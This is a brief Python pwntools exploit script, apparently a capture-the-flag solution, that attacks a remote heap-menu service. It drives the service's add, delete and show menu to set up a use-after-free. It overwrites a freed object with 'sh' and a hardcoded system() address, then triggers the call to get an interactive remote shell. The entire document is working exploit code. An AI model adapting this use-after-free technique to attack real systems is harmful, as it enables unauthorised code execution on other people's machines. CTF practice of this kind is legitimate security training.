from pwn import *
p=remote('redirect.do-not-trust.hacking.run',10053)

def add(i,t,size,v):
 p.recvuntil('>')
 p.sendline('1')
 p.recvuntil('>')
 p.sendline(i)
 p.recvuntil('>')
 p.sendline(t)
 p.recvuntil('>')
 p.sendline(size)
 p.recvuntil('>')
 p.sendline(v)
 
def deln(i):
 p.recvuntil('>')
 p.sendline('2')
 p.recvuntil('>')
 p.sendline(i)
 
def show(i):
 p.recvuntil('>')
 p.sendline('3')
 p.recvuntil('>')
 p.sendline(i)
 
system=0x08048500


add('0','2','12','a')
add('1','2','12','a')
deln('0')
deln('1')
add('2','2','24','a')
add('3','2','12',b'sh\x00\x00'+p32(system))
deln('0')
p.interactive()
 
 
